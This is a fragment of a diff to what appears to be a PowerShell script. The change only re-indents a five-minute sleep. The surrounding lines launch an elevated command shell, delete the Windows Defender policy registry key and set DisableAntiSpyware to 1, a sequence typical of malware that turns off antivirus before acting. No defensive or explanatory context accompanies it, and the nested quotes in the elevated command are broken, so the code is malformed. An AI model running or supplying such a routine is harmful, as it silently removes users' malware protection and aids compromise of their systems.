@@ -1,4 +1,4 @@
-    Start-Sleep -s 300
+Start-Sleep -s 300
 Start-Process -FilePath "$env:comspec" -Verb
 RunAs -ArgumentList "reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
